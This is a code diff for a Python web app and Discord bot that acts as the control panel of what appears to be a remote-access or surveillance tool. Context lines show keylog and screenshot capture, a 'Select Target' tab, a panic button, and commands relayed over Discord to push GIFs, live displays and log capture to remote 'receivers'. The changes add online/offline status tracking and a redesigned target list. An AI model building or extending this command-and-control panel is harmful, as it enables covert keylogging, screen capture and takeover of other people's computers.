@@ -50,9 +50,10 @@ ROOT_DIR = Path(__file__).parent
 _latest_screenshot: dict[str, str] = {"url": "", "message_id": "", "ts": ""}
 _latest_keylog: dict[str, str] = {"text": "", "message_id": "", "ts": ""}
 STATE_FILE = ROOT_DIR / "receivers.json"
-_receivers: dict[str, dict] = {}  # id -> {"alias": str, "last_seen": float, "tag": str}
+_receivers: dict[str, dict] = {}  # id -> {"alias": str, "last_seen": float, "tag": str, "mode": str}
 _selected_receiver: Optional[str] = None
 STALE_SECONDS = 90
+PRUNE_SECONDS = 60 * 60 * 24 * 30
 
 def _load_state():
     global _receivers, _selected_receiver
@@ -77,7 +78,7 @@ def _prune_receivers(now: Optional[float] = None) -> bool:
     removed = False
     for rid in list(_receivers.keys()):
         last_seen = _receivers[rid].get("last_seen", 0)
-        if now - last_seen > STALE_SECONDS:
+        if now - last_seen > PRUNE_SECONDS:
             _receivers.pop(rid, None)
             removed = True
             if _selected_receiver == rid:
@@ -85,6 +86,32 @@ def _prune_receivers(now: Optional[float] = None) -> bool:
     if removed:
         _save_state()
     return removed
+
+def _receiver_status(info: dict, now: Optional[float] = None) -> tuple[str, str, bool]:
+    if now is None:
+        now = time.time()
+    last_seen = info.get("last_seen", 0)
+    online = (now - last_seen) <= STALE_SECONDS
+    if not online:
+        return ("Offline", "offline", False)
+    mode = (info.get("mode") or "").lower()
+    if mode in ("gif", "gif_display"):
+        return ("Gif Display", "gif", True)
+    if mode in ("live", "live_display"):
+        return ("Live Display", "live", True)
+    return ("Online", "online", True)
+
+def _set_receiver_mode(rid: Optional[str], mode: str):
+    if not rid:
+        return
+    info = _receivers.get(rid)
+    if not info:
+        return
+    if mode:
+        info["mode"] = mode
+    else:
+        info.pop("mode", None)
+    _save_state()
 
 _load_state()
 
@@ -142,8 +169,9 @@ async def on_message(message: discord.Message):
             receiver_id = tokens[1].strip()
             tag = tokens[2].strip()
             now = time.time()
-            entry = _receivers.get(receiver_id, {"alias": "", "tag": tag, "last_seen": now})
+            entry = _receivers.get(receiver_id, {"alias": "", "tag": tag, "last_seen": now, "mode": ""})
             entry.setdefault("alias", "")
+            entry.setdefault("mode", "")
             entry["tag"] = tag
             entry["last_seen"] = now
             _receivers[receiver_id] = entry
@@ -210,6 +238,22 @@ CONTROL_HTML = """<!doctype html>
     .tab-pane { display: none; }
     .tab-pane.active { display: block; }
     .receiver-row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+    .receiver-list { display: grid; gap: 12px; }
+    .receiver-item { display: grid; grid-template-columns: 1fr auto; gap: 12px; align-items: center; padding: 12px; border: 1px solid var(--border); border-radius: 12px; background: #0c0817; }
+    .receiver-item.selected { border-color: rgba(155,92,255,0.7); box-shadow: 0 0 0 1px rgba(155,92,255,0.4); }
+    .receiver-info { display: flex; flex-direction: column; gap: 6px; }
+    .receiver-name { font-weight: 700; letter-spacing: 0.2px; }
+    .receiver-meta { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; font-size: 12px; color: var(--muted); }
+    .status-pill { padding: 4px 8px; border-radius: 999px; font-size: 10px; text-transform: uppercase; letter-spacing: 0.6px; border: 1px solid var(--border); background: #120a22; }
+    .status-online { border-color: rgba(34,197,94,0.5); color: #86efac; background: rgba(34,197,94,0.12); }
+    .status-offline { border-color: rgba(239,68,68,0.45); color: #fecaca; background: rgba(239,68,68,0.12); }
+    .status-gif { border-color: rgba(251,146,60,0.45); color: #fdba74; background: rgba(251,146,60,0.12); }
+    .status-live { border-color: rgba(56,189,248,0.45); color: #bae6fd; background: rgba(56,189,248,0.12); }
+    .receiver-actions { display: flex; gap: 8px; flex-wrap: wrap; justify-content: flex-end; }
+    .receiver-actions form { margin: 0; }
+    .receiver-id { opacity: 0.8; }
+    .receiver-summary { margin: 0 0 10px; color: var(--muted); font-size: 12px; }
+    .receiver-empty { padding: 12px; border: 1px dashed var(--border); border-radius: 12px; color: var(--muted); }
     .rename-input { width: 180px; min-width: 140px; margin-bottom: 0; }
     .panic-btn { position: fixed; right: 24px; bottom: 24px; z-index: 999; background: linear-gradient(135deg, #f97316, var(--danger)); color: #0b0419; box-shadow: 0 12px 24px rgba(239,68,68,0.35); }
     .panic-btn:active { transform: translateY(1px); }
@@ -244,7 +288,8 @@ CONTROL_HTML = """<!doctype html>
       </div>
       <div class="tab-pane" data-tab="select">
         <h1>Select Target</h1>
-        <div id="receiver-buttons" class="row" style="flex-wrap: wrap;"></div>
+        <div id="receiver-summary" class="receiver-summary"></div>
+        <div id="receiver-list" class="receiver-list"></div>
       </div>
       <div class="tab-pane" data-tab="openclose">
         <h1>Open & Close :3</h1>
@@ -370,11 +415,55 @@ CONTROL_HTML = """<!doctype html>
         if (!res.ok) return;
         const data = await res.json();
         selectedReceiver = data.selected || null;
-        const wrap = document.getElementById('receiver-buttons');
+        const wrap = document.getElementById('receiver-list');
+        const summary = document.getElementById('receiver-summary');
+        if (!wrap) return;
         wrap.innerHTML = '';
-        (data.online || []).forEach(rec => {
-          const row = document.createElement('div');
-          row.className = 'receiver-row';
+        const online = data.online || [];
+        const offline = data.offline || [];
+        if (summary) {
+          summary.textContent = `${online.length} online | ${offline.length} offline`;
+        }
+        const all = online.concat(offline);
+        if (!all.length) {
+          const empty = document.createElement('div');
+          empty.className = 'receiver-empty';
+          empty.textContent = 'No receivers yet. Open a receiver to appear here.';
+          wrap.appendChild(empty);
+        }
+        all.forEach(rec => {
+          const item = document.createElement('div');
+          item.className = 'receiver-item';
+          if (data.selected === rec.id) {
+            item.classList.add('selected');
+          }
+
+          const info = document.createElement('div');
+          info.className = 'receiver-info';
+
+          const name = document.createElement('div');
+          name.className = 'receiver-name';
+          name.textContent = rec.name || rec.tag || rec.id;
+
+          const meta = document.createElement('div');
+          meta.className = 'receiver-meta';
+
+          const status = document.createElement('span');
+          const statusKey = rec.status_key || (rec.online ? 'online' : 'offline');
+          status.className = 'status-pill status-' + statusKey;
+          status.textContent = rec.status || (rec.online ? 'Online' : 'Offline');
+
+          const idSpan = document.createElement('span');
+          idSpan.className = 'receiver-id';
+          idSpan.textContent = rec.tag ? ('Tag: ' + rec.tag) : ('ID: ' + rec.id);
+
+          meta.appendChild(status);
+          meta.appendChild(idSpan);
+          info.appendChild(name);
+          info.appendChild(meta);
+
+          const actions = document.createElement('div');
+          actions.className = 'receiver-actions';
 
           const selectForm = document.createElement('form');
           selectForm.method = 'post';
@@ -382,7 +471,10 @@ CONTROL_HTML = """<!doctype html>
           wireForm(selectForm);
           const btn = document.createElement('button');
           btn.type = 'submit';
-          btn.textContent = rec.name || rec.tag || rec.id;
+          btn.textContent = data.selected === rec.id ? 'Selected' : 'Select';
+          if (!rec.online) {
+            btn.className = 'secondary';
+          }
           if (data.selected === rec.id) {
             btn.style.background = '#10b981';
             btn.style.color = '#0b1224';
@@ -406,9 +498,12 @@ CONTROL_HTML = """<!doctype html>
           renameForm.appendChild(input);
           renameForm.appendChild(renameBtn);
 
-          row.appendChild(selectForm);
-          row.appendChild(renameForm);
-          wrap.appendChild(row);
+          actions.appendChild(selectForm);
+          actions.appendChild(renameForm);
+
+          item.appendChild(info);
+          item.appendChild(actions);
+          wrap.appendChild(item);
         });
         const panicBtn = document.getElementById('panic-btn');
         if (panicBtn) {
@@ -597,6 +692,7 @@ async def gif_start():
     if not await _wait_controller_ready():
         return JSONResponse({"ok": False, "error": "bot not ready"}, status_code=503)
     await _send_cmd(_cmd_with_selection("DISPLAY_GIF_START"))
+    _set_receiver_mode(_selected_receiver, "gif")
     return JSONResponse({"ok": True})
 
 @app.post("/cmd/gif/stop")
@@ -604,6 +700,7 @@ async def gif_stop():
     if not await _wait_controller_ready():
         return JSONResponse({"ok": False, "error": "bot not ready"}, status_code=503)
     await _send_cmd(_cmd_with_selection("DISPLAY_GIF_STOP"))
+    _set_receiver_mode(_selected_receiver, "")
     return JSONResponse({"ok": True})
 
 @app.get("/api/screenshot")
@@ -619,18 +716,26 @@ async def api_receivers():
     now = time.time()
     _prune_receivers(now)
     online = []
+    offline = []
     for rid, info in _receivers.items():
         alias = info.get("alias") or ""
         display = alias or info.get("tag") or rid
+        status, status_key, is_online = _receiver_status(info, now)
         data = {
             "id": rid,
             "name": display,
             "tag": info.get("tag"),
             "alias": alias,
             "last_seen": info.get("last_seen", 0),
+            "status": status,
+            "status_key": status_key,
+            "online": is_online,
         }
-        online.append(data)
-    return JSONResponse({"online": online, "offline": [], "selected": _selected_receiver})
+        if is_online:
+            online.append(data)
+        else:
+            offline.append(data)
+    return JSONResponse({"online": online, "offline": offline, "selected": _selected_receiver})
 
 @app.post("/ui/surprise")
 async def ui_surprise():
@@ -650,6 +755,7 @@ async def ui_surprise():
     if not await _wait_controller_ready():
         return HTMLResponse("Discord bot not ready", status_code=503)
     await _send_cmd_with_files(_cmd_with_selection("DISPLAY_GIF_START"), files)
+    _set_receiver_mode(_selected_receiver, "gif")
     return RedirectResponse(url="/", status_code=303)
 
 @app.post("/ui/gif/stop")
@@ -664,6 +770,7 @@ async def ui_live_start():
     if not await _wait_controller_ready():
         return HTMLResponse("Discord bot not ready", status_code=503)
     await _send_cmd(_cmd_with_selection("LIVE_START"))
+    _set_receiver_mode(_selected_receiver, "live")
     return RedirectResponse(url="/", status_code=303)
 
 @app.post("/ui/live/stop")
@@ -671,6 +778,7 @@ async def ui_live_stop():
     if not await _wait_controller_ready():
         return HTMLResponse("Discord bot not ready", status_code=503)
     await _send_cmd(_cmd_with_selection("LIVE_STOP"))
+    _set_receiver_mode(_selected_receiver, "")
     return RedirectResponse(url="/", status_code=303)
 
 @app.post("/ui/logs/start")
